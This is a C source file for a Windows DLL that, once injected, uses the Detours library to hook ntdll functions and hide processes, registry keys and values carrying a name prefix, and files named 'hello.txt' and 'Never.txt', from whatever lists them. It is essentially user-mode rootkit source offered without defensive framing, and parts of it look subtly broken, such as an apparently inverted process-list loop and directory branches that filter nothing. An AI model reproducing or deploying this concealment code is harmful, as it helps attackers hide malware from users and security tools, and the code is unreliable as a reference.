#include <Windows.h>
#include <stdio.h>
#include "Structs.h"
#include "typedef.h"
#include "GGdef.h"
#include "GGWin.h"
#include "includes/detours/detours.h"
#include <Shlwapi.h>

#pragma comment(lib, "includes\\detours\\detours.lib")
#pragma comment(lib, "Shlwapi.lib")

/* ------------------------------------------------------------------------------------------------------ */

fnNtQuerySystemInformation g_NtQuerySystemInformation;
fnNtQueryDirectoryFile g_NtQueryDirectoryFile;
fnRtlUnicodeStringToAnsiString g_RtlUnicodeStringToAnsiString;
fnNtQueryDirectoryFileEx g_NtQueryDirectoryFileEx;
fnNtEnumerateKey g_NtEnumerateKey;
fnNtEnumerateValueKey g_NtEnumerateValueKey;

DWORD TlsNtEnumerateKeyCacheKey;
DWORD TlsNtEnumerateKeyCacheIndex;
DWORD TlsNtEnumerateKeyCacheI;
DWORD TlsNtEnumerateKeyCacheCorrectedIndex;
DWORD TlsNtEnumerateValueKeyCacheKey;
DWORD TlsNtEnumerateValueKeyCacheIndex;
DWORD TlsNtEnumerateValueKeyCacheI;
DWORD TlsNtEnumerateValueKeyCacheCorrectedIndex;

/* ------------------------------------------------------------------------------------------------------ */


NTSTATUS MyNtQuerySystemInformation( SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation,
                                     ULONG SystemInformationLength, PULONG ReturnLength )
{
	NTSTATUS stat = g_NtQuerySystemInformation( SystemInformationClass, SystemInformation, SystemInformationLength,
	                                            ReturnLength );

	if ( SystemInformationClass == SystemProcessInformation && stat == 0 )
	{
		// Checks if current NtQuery is SystemProcessInformation

		PSYSTEM_PROCESS_INFORMATION Previous = SystemInformation;
		PSYSTEM_PROCESS_INFORMATION Current = ( PSYSTEM_PROCESS_INFORMATION )( ( PUCHAR )Previous + Previous->
			NextEntryOffset );

		while ( !Previous->NextEntryOffset )
		{
			if ( HasPrefix( Current->ImageName.Buffer ) )
			{
				if ( Current->NextEntryOffset == 0 )
				{
					Previous->NextEntryOffset = 0;
				}
				else
				{
					Previous->NextEntryOffset += Current->NextEntryOffset;
				}
				Current = Previous;
			}

			Previous = Current;
			Current = ( PSYSTEM_PROCESS_INFORMATION )( ( PUCHAR )Current + Current->NextEntryOffset );
		}
	}

	return stat;
}

NTSTATUS MyNtQueryDirectoryFile( HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext,
                                 PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length,
                                 FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry,
                                 PUNICODE_STRING FileName, BOOLEAN RestartScan )
{
	NTSTATUS stat = g_NtQueryDirectoryFile( FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
	                                        Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan );

	PFILE_FULL_DIR_INFO pFileFullDirInfo;
	PFILE_FULL_DIR_INFO pFileBothDirInfo;

	if ( FileInformationClass == FileFullDirectoryInformation )
	{
		pFileFullDirInfo = ( PFILE_FULL_DIR_INFO )FileInformation;
		while ( pFileFullDirInfo->NextEntryOffset )
		{
			pFileFullDirInfo = ( PFILE_FULL_DIR_INFO )( ( LPBYTE )pFileFullDirInfo + pFileFullDirInfo->
				NextEntryOffset );
		}
	}
	else if ( FileInformationClass == FileBothDirectoryInformation )
	{
		pFileBothDirInfo = ( PFILE_FULL_DIR_INFO )FileInformation;
		while ( pFileBothDirInfo->NextEntryOffset )
		{
			pFileBothDirInfo = ( PFILE_FULL_DIR_INFO )( ( LPBYTE )pFileBothDirInfo + pFileBothDirInfo->
				NextEntryOffset );
		}
	}
	else if ( FileInformationClass == FileIdBothDirectoryInformation )
	{
		PFILE_ID_BOTH_DIR_INFO current = FileInformation;

		while ( current->NextEntryOffset )
		{
			PFILE_ID_BOTH_DIR_INFO next = ( PFILE_ID_BOTH_DIR_INFO )( ( LPBYTE )current + current->NextEntryOffset );

			// comparing name
			if ( CompareToFileName( next, "hello.txt" ) == TRUE )
			{
				if ( next->NextEntryOffset != 0 )
				{
					next = ( PFILE_ID_BOTH_DIR_INFO )( ( LPBYTE )next + next->NextEntryOffset );
					current->NextEntryOffset += next->NextEntryOffset;
				}
				else
				{
					current->NextEntryOffset = 0;
				}
			}
			else
			{
				current = next;
			}
		}
	}
	return stat;
}

NTSTATUS MyNtQueryDirectoryFileEx( HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext,
                                   PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length,
                                   FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags,
                                   PUNICODE_STRING FileName )
{
	NTSTATUS stat = g_NtQueryDirectoryFileEx( FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
	                                          Length, FileInformationClass, QueryFlags, FileName );

	PFILE_FULL_DIR_INFO pFileFullDirInfo;
	PFILE_FULL_DIR_INFO pFileBothDirInfo;

	if ( FileInformationClass == FileFullDirectoryInformation )
	{
		pFileFullDirInfo = ( PFILE_FULL_DIR_INFO )FileInformation;
		while ( pFileFullDirInfo->NextEntryOffset )
		{
			pFileFullDirInfo = ( PFILE_FULL_DIR_INFO )( ( LPBYTE )pFileFullDirInfo + pFileFullDirInfo->
				NextEntryOffset );
		}
	}
	else if ( FileInformationClass == FileBothDirectoryInformation )
	{
		pFileBothDirInfo = ( PFILE_FULL_DIR_INFO )FileInformation;
		while ( pFileBothDirInfo->NextEntryOffset )
		{
			pFileBothDirInfo = ( PFILE_FULL_DIR_INFO )( ( LPBYTE )pFileBothDirInfo + pFileBothDirInfo->
				NextEntryOffset );
		}
	}
	else if ( FileInformationClass == FileIdBothDirectoryInformation )
	{
		PFILE_ID_BOTH_DIR_INFO current = FileInformation;

		while ( current->NextEntryOffset )
		{
			PFILE_ID_BOTH_DIR_INFO next = ( PFILE_ID_BOTH_DIR_INFO )( ( LPBYTE )current + current->NextEntryOffset );

			// comparing name
			if ( CompareToFileName( next, "Never.txt" ) == TRUE )
			{
				if ( next->NextEntryOffset != 0 )
				{
					next = ( PFILE_ID_BOTH_DIR_INFO )( ( LPBYTE )next + next->NextEntryOffset );
					current->NextEntryOffset += next->NextEntryOffset;
				}
				else
				{
					current->NextEntryOffset = 0;
				}
			}
			else
			{
				current = next;
			}
		}
	}
	return stat;
}

NTSTATUS MyNtEnumerateKey( HANDLE KeyHandle, ULONG Index, NT_KEY_INFORMATION_CLASS KeyInformationClass,
                           PVOID KeyInformation, ULONG Length, PULONG ResultLength )
{
	if ( KeyInformationClass == KeyNodeInformation )
	{
		return g_NtEnumerateKey( KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength );
	}

	HANDLE cacheKey = TlsGetValue( TlsNtEnumerateKeyCacheKey );
	ULONG cacheIndex = ( ULONG )TlsGetValue( TlsNtEnumerateKeyCacheIndex );
	ULONG cacheI = ( ULONG )TlsGetValue( TlsNtEnumerateKeyCacheI );
	ULONG cacheCorrectedIndex = ( ULONG )TlsGetValue( TlsNtEnumerateKeyCacheCorrectedIndex );

	ULONG i = 0;
	ULONG correctedIndex = 0;

	if ( cacheKey == KeyHandle && cacheIndex == Index - 1 )
	{
		// This function was recently called the index - 1, so we can continue from the last known position.
		// This increases performance from O(N^2) to O(N).
		i = cacheI;
		correctedIndex = cacheCorrectedIndex + 1;
	}

	BYTE buffer[ 1024 ];
	PNT_KEY_BASIC_INFORMATION basicInformation = buffer;

	for ( ; i <= Index; correctedIndex++ )
	{
		if ( g_NtEnumerateKey( KeyHandle, correctedIndex, KeyBasicInformation, basicInformation, 1024, ResultLength ) !=
			ERROR_SUCCESS )
		{
			return g_NtEnumerateKey( KeyHandle, correctedIndex, KeyInformationClass, KeyInformation, Length,
			                         ResultLength );
		}

		if ( !HasPrefix( basicInformation->Name ) )
		{
			i++;
		}
	}

	correctedIndex--;

	TlsSetValue( TlsNtEnumerateKeyCacheKey, KeyHandle );
	TlsSetValue( TlsNtEnumerateKeyCacheIndex, Index );
	TlsSetValue( TlsNtEnumerateKeyCacheI, i );
	TlsSetValue( TlsNtEnumerateKeyCacheCorrectedIndex, correctedIndex );

	return g_NtEnumerateKey( KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength );
}

NTSTATUS MyNtEnumerateValueKey( HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass,
                                LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength )
{
	HANDLE cacheKey = TlsGetValue( TlsNtEnumerateValueKeyCacheKey );
	ULONG cacheIndex = ( ULONG )TlsGetValue( TlsNtEnumerateValueKeyCacheIndex );
	ULONG cacheI = ( ULONG )TlsGetValue( TlsNtEnumerateValueKeyCacheI );
	ULONG cacheCorrectedIndex = ( ULONG )TlsGetValue( TlsNtEnumerateValueKeyCacheCorrectedIndex );

	ULONG i = 0;
	ULONG correctedIndex = 0;

	if ( cacheKey == key && cacheIndex == index - 1 )
	{
		// This function was recently called the index - 1, so we can continue from the last known position.
		// This increases performance from O(N^2) to O(N).
		i = cacheI;
		correctedIndex = cacheCorrectedIndex + 1;
	}

	BYTE buffer[ 1024 ];
	PNT_KEY_VALUE_BASIC_INFORMATION basicInformation = buffer;

	for ( ; i <= index; correctedIndex++ )
	{
		if ( g_NtEnumerateValueKey( key, correctedIndex, KeyValueBasicInformation, basicInformation, 1024,
		                            resultLength ) != ERROR_SUCCESS )
		{
			return g_NtEnumerateValueKey( key, correctedIndex, keyValueInformationClass, keyValueInformation,
			                              keyValueInformationLength, resultLength );
		}

		if ( !HasPrefix( basicInformation->Name ) )
		{
			i++;
		}
	}

	correctedIndex--;

	TlsSetValue( TlsNtEnumerateValueKeyCacheKey, key );
	TlsSetValue( TlsNtEnumerateValueKeyCacheIndex, index );
	TlsSetValue( TlsNtEnumerateValueKeyCacheI, i );
	TlsSetValue( TlsNtEnumerateValueKeyCacheCorrectedIndex, correctedIndex );

	return g_NtEnumerateValueKey( key, correctedIndex, keyValueInformationClass, keyValueInformation,
	                              keyValueInformationLength, resultLength );
}

/*----------------------------------------------------------------------------------------------------------*/

VOID InstallHook( LPCSTR dll, LPCSTR function, LPVOID* originalFunction, LPVOID hookedFunction )
{
	*originalFunction = GetProcAddress( GetModuleHandleA( dll ), function );
	if ( *originalFunction )
		DetourAttach( originalFunction, hookedFunction );
}

VOID Unhook( LPVOID* originalFunction, LPVOID hookedFunction )
{
	if ( *originalFunction )
		DetourDetach( originalFunction, hookedFunction );
}

VOID InitializeHooks()
{
	DetourTransactionBegin();
	DetourUpdateThread( GetCurrentThread() );
	InstallHook( "ntdll.dll", "NtQuerySystemInformation", &g_NtQuerySystemInformation, MyNtQuerySystemInformation );
	InstallHook( "ntdll.dll", "NtQueryDirectoryFile", &g_NtQueryDirectoryFile, MyNtQueryDirectoryFile );
	InstallHook( "ntdll.dll", "NtQueryDirectoryFileEx", &g_NtQueryDirectoryFileEx, MyNtQueryDirectoryFileEx );
	InstallHook( "ntdll.dll", "NtEnumerateKey", &g_NtEnumerateKey, MyNtEnumerateKey );
	InstallHook( "ntdll.dll", "NtEnumerateValueKey", &g_NtEnumerateValueKey, MyNtEnumerateValueKey );
	DetourTransactionCommit();

	TlsNtEnumerateKeyCacheKey = TlsAlloc();
	TlsNtEnumerateKeyCacheIndex = TlsAlloc();
	TlsNtEnumerateKeyCacheI = TlsAlloc();
	TlsNtEnumerateKeyCacheCorrectedIndex = TlsAlloc();
	TlsNtEnumerateValueKeyCacheKey = TlsAlloc();
	TlsNtEnumerateValueKeyCacheIndex = TlsAlloc();
	TlsNtEnumerateValueKeyCacheI = TlsAlloc();
	TlsNtEnumerateValueKeyCacheCorrectedIndex = TlsAlloc();
}

VOID UninitializeHooks()
{
	DetourTransactionBegin();
	DetourUpdateThread( GetCurrentThread() );
	Unhook( &g_NtQuerySystemInformation, MyNtQuerySystemInformation );
	Unhook( &g_NtQueryDirectoryFile, MyNtQueryDirectoryFile );
	Unhook( &g_NtQueryDirectoryFileEx, MyNtQueryDirectoryFileEx );
	Unhook( &g_NtEnumerateKey, MyNtEnumerateKey );
	Unhook( &g_NtEnumerateValueKey, MyNtEnumerateValueKey );
	DetourTransactionCommit();

	TlsFree( TlsNtEnumerateKeyCacheKey );
	TlsFree( TlsNtEnumerateKeyCacheIndex );
	TlsFree( TlsNtEnumerateKeyCacheI );
	TlsFree( TlsNtEnumerateKeyCacheCorrectedIndex );
	TlsFree( TlsNtEnumerateValueKeyCacheKey );
	TlsFree( TlsNtEnumerateValueKeyCacheIndex );
	TlsFree( TlsNtEnumerateValueKeyCacheI );
	TlsFree( TlsNtEnumerateValueKeyCacheCorrectedIndex );
}

/*----------------------------------------------------------------------------------------------------------*/

BOOL WINAPI DllMain( HINSTANCE hModule, DWORD fdwReason, LPVOID lpReserved )
{
	g_RtlUnicodeStringToAnsiString = ( fnRtlUnicodeStringToAnsiString )GetProcAddress(
		GetModuleHandle( TEXT( "ntdll.dll" ) ), "RtlUnicodeStringToAnsiString" );

	if ( fdwReason == DLL_PROCESS_ATTACH )
	{
		InitializeHooks();
	}
	if ( fdwReason == DLL_PROCESS_DETACH )
	{
		UninitializeHooks();
	}

	return TRUE;
}

BOOL CompareToFileName( PFILE_ID_BOTH_DIR_INFO pFileIdBothDirInfo, const char* fileName )
{
	ANSI_STRING as = {0};
	UNICODE_STRING EntryName = {0};
	EntryName.MaximumLength = EntryName.Length = ( USHORT )pFileIdBothDirInfo->FileNameLength;
	EntryName.Buffer = &pFileIdBothDirInfo->FileName[ 0 ];
	g_RtlUnicodeStringToAnsiString( &as, &EntryName, TRUE );

	if ( strcmp( as.Buffer, fileName ) == 0 )
	{
		return TRUE;
	}
	return FALSE;

	return TRUE;
}
